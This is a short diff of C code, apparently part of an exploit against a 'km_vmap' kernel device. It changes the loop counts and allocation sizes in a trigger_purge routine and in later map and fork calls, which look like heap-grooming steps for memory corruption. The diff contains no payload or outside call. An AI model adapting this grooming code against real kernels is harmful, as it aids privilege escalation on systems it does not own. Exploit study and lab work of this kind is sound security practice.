@@ -56,10 +56,8 @@ void km_vmap_unfork(int fd, struct km_vmap_user_fork *req) {
 
 size_t trigger_purge(int fd, struct km_vmap_user_map *maps) {
     int i;
-    for (i = 0; i < 128; i++) {
+    for (i = 0; i < 0x80; i++) {
         km_vmap_map(fd, &maps[i], 0x100000);
-    }
-    for (i = 0; i < 128; i++) {
         km_vmap_unmap(fd, &maps[i]);
     }
 }
@@ -107,11 +105,11 @@ int main() {
 
     trigger_purge(fd, maps);
 
-    for (i = 0; i < 0x20; i++) {
-        km_vmap_map(fd, mapsoff++, 0x4000);
+    for (i = 0; i < 0x10; i++) {
+        km_vmap_map(fd, mapsoff++, 0x8000);
     }
 
-    for (i = 0; i < 0x30; i++) {
+    for (i = 0; i < 0x20; i++) {
         km_vmap_fork(fd, &procs[i]);
     }
 
